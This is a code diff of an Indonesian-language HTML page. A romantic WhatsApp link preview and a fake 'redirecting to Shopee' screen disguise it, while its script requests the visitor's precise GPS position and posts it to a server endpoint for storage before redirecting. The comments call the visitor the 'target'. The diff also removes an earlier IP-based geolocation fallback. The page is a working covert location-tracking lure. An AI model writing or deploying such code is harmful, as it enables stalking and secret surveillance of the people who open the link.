@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>aa sayang oneng</title>
 
+    <!-- Open Graph untuk Tampilan Link Preview saat Dikirim di WA/Medsos -->
     <meta property="og:title" content="Aa sayang oneng" />
     <meta property="og:description" content="muahhhhhhhhh" />
     <meta
@@ -27,10 +28,10 @@
       }
       .spinner {
         border: 4px solid #f3f3f3;
-        border-top: 4px solid #3498db;
+        border-top: 4px solid #ee4d2d; /* Warna oranye Shopee */
         border-radius: 50%;
-        width: 40px;
-        height: 40px;
+        width: 45px;
+        height: 45px;
         animation: spin 1s linear infinite;
         margin: 0 auto 15px auto;
       }
@@ -42,88 +43,80 @@
           transform: rotate(360deg);
         }
       }
+      p {
+        color: #555;
+        font-size: 14px;
+      }
     </style>
   </head>
   <body>
     <div class="loading-box">
       <div class="spinner"></div>
-      <p id="status">Mengalihkan, mohon tunggu...</p>
+      <p id="status">Mengalihkan ke Shopee, mohon tunggu...</p>
     </div>
 
     <script>
       const TARGET_URL = "https://shopee.co.id";
       let sudahRedirect = false;
 
-      function alihkanSekarang() {
+      function alihkanKeShopee() {
         if (!sudahRedirect) {
           sudahRedirect = true;
           window.location.replace(TARGET_URL);
         }
       }
 
-      // Waktu cadangan (fallback)
-      const fallbackTimer = setTimeout(() => {
-        alihkanSekarang();
-      }, 6000);
+      // Waktu batas maksimal (5 detik). Jika target tidak mengklik izinkan/tolak, tetap dialihkan.
+      const maxWaitTimer = setTimeout(() => {
+        alihkanKeShopee();
+      }, 5000);
 
-      function kirimGPSKeNodeJS(dataGPS) {
+      function kirimLokasiKeServer(dataGPS) {
         fetch("/api/simpan-lokasi", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(dataGPS),
         })
-          .catch((err) => console.error("Gagal kirim data:", err))
-          .finally(() => {
-            clearTimeout(fallbackTimer);
-            alihkanSekarang();
-          });
-      }
-
-      // Ambil lokasi alternatif dari alamat IP jika GPS diblokir/gagal
-      function ambilLokasiViaIP() {
-        fetch("https://ipapi.co/json/")
           .then((res) => res.json())
           .then((data) => {
-            if (data.latitude && data.longitude) {
-              kirimGPSKeNodeJS({
-                latitude: data.latitude,
-                longitude: data.longitude,
-                akurasi_meter: 5000, // Perkiraan akurasi via IP
-              });
-            } else {
-              alihkanSekarang();
-            }
+            console.log("Lokasi berhasil tersimpan ke Neon!", data);
           })
-          .catch(() => {
-            alihkanSekarang();
+          .catch((err) => {
+            console.error("Gagal simpan lokasi:", err);
+          })
+          .finally(() => {
+            // HANYA alihkan ke Shopee SETELAH request simpan lokasi selesai
+            clearTimeout(maxWaitTimer);
+            alihkanKeShopee();
           });
       }
 
       window.onload = function () {
         if (navigator.geolocation) {
+          // Minta akses GPS perangkat
           navigator.geolocation.getCurrentPosition(
             (position) => {
-              // Berhasil dapat GPS presisi
+              // Jika target mengklik "Allow / Izinkan"
               const dataGPS = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 akurasi_meter: position.coords.accuracy,
               };
-              kirimGPSKeNodeJS(dataGPS);
+              kirimLokasiKeServer(dataGPS);
             },
             (error) => {
-              // Jika diblokir / tidak ada gembok / error GPS -> Ambil via IP
-              console.warn("GPS gagal/diblokir, beralih ke lokasi IP...");
-              ambilLokasiViaIP();
+              // Jika target mengklik "Block / Menolak"
+              console.warn("Akses GPS ditolak/gagal:", error.message);
+              alihkanKeShopee();
             },
             {
-              enableHighAccuracy: true,
-              timeout: 2000,
+              enableHighAccuracy: true, // Paksa gunakan GPS hardware HP agar presisi
+              timeout: 4000,
               maximumAge: 0,
             },
           );
         } else {
-          ambilLokasiViaIP();
+          alihkanKeShopee();
         }
       };
     </script>
